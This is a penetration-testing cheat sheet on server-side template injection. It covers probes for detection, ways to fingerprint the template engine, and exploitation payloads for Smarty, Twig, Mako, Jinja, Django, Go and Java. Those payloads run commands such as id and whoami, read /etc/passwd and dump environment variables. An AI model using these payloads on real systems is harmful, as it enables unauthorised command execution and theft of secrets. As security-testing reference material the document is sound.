# SSTI
 ## Detection
You can follow a similar approach when looking for template / expression language injections to the one you use when testing an application for stored XSS vulnerabilities - injecting a payload and looking for occurrences of it within the application

> If you are a user of Burp Suite Pro, you should get an extension named J2EE Scan which automatically adds tests for expression language injection

- Try  fuzzing Templating special charchters and see if any exception is raised 
	```
	${{<%[%'"}}%\
	${}
	{{}}
	<%= %>
	${7/0}
	{{7/0}}
	<%= 7/0 %>
	${foobar}
	{{foobar}}
	<%= foobar %>
	${7/0}
	{{7/0}}
	```

- Try to check if it contains a direct XSS vulnerability. Try injecting arbitrary HTML.
	```
	http://vulnerable-website.com/?greeting=data.username<tag>
	```
	In the absence of XSS, this will usually either result in a blank entry in the output (just Hello with no username), encoded tags, or an error message. 
	
- Try and break out of the statement using common templating syntax and attempt to inject arbitrary HTML after it
	```
	http://vulnerable-website.com/?greeting=data.username}}<tag>
	```
if the output is rendered correctly, along with the arbitrary HTML, this is a key indication that a server-side template injection vulnerability is present:
	
## Identify Technology
To better identify the technology, you can first:
- Observe which is the generic technology of the application. If it is java (e.g., you see it uses .jsp extensions), then you can suspect it is an expression language / OGNL.
- Use this diagram as it contains popular behavior of template engines when handling expressions.
![Pasted image 20210602032331.png](/Screenshots/Pasted%20image%2020210602032331.png)
- Try to inject unclosed curly braces (be careful as there is a chance you might permanently disable the attacked webpage); this might provoke verbose error disclosing the underlying technology.
- Observe other verbose errors for technology names.
- If you suspect a specific technology, Check documentation for functions specific to that technology such as PHP Twig. Php Twig Can be confirmed by
```php
{{_self.env.display("xyz")}}
```

Another Methodology is:
Although there are a huge number of templating languages, many of them use very similar syntax that is specifically chosen not to clash with HTML characters. As a result, it can be relatively simple to create probing payloads to test which template engine is being used.

Simply submitting invalid syntax is often enough because the resulting error message will tell you exactly what the template engine is, and sometimes even which version.

For example, the invalid expression `<%=foobar%>` triggers the following response from the Ruby-based ERB engine:

```ruby
(erb):1:in `<main>': undefined local variable or method `foobar' for main:Object (NameError)
from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval'
from /usr/lib/ruby/2.5.0/erb.rb:876:in `result'
from -e:4:in `<main>'
```


## Exploitation



## Exploiting Technology Specific SSTIs
### PHP
#### Smarty
```php
{php}echo `id`;{/php}
```

#### Twig
```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_s
elf.env.getFilter("whoami")}}
```

### Python
#### Maki
```python
<%
import os
x=os.popen('id').read()
%>
${x}
```

#### Jinja
```pyhon
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
```

#### Django
Explore the enviorment with
```python
{% debug %}
```

#### GO'S TEMPLATE ENGINE 
```go
// return the data structure passed into the template
{{ . }}
{{ self }}
```
### Read about the security implications in documentation
In addition to providing the fundamentals of how to create and use templates, the documentation may also provide some sort of "Security" section. The name of this section will vary, but it will usually outline all the potentially dangerous things that people should avoid doing with the template. This can be an invaluable resource, even acting as a kind of cheat sheet for which behaviors you should look for during auditing, as well as how to exploit them.

Even if there is no dedicated "Security" section, if a particular built-in object or function can pose a security risk, there is almost always a warning of some kind in the documentation. The warning may not provide much detail, but at the very least it should flag this particular built-in as something to investigate.

### Explore enviroment objects
At this point, you might have already stumbled across a workable exploit using the documentation. If not, the next step is to explore the environment and try to discover all the objects to which you have access.

Many template engines expose a "self" or "environment" object of some kind, which acts like a namespace containing all objects, methods, and attributes that are supported by the template engine. If such an object exists, you can potentially use it to generate a list of objects that are in scope. For example, in Java-based templating languages, you can sometimes list all variables in the environment using the following injection:

```java
${T(java.lang.System).getenv()}
```

### Developer-supplied objects
Websites will contain both built-in objects provided by the template and custom, site-specific objects that have been supplied by the web developer. Pay particular attention to these non-standard objects because they are especially likely to contain sensitive information or exploitable methods. As these objects can vary between different templates within the same website, be aware that you might need to study an object's behavior in the context of each distinct template before you find a way to exploit it.

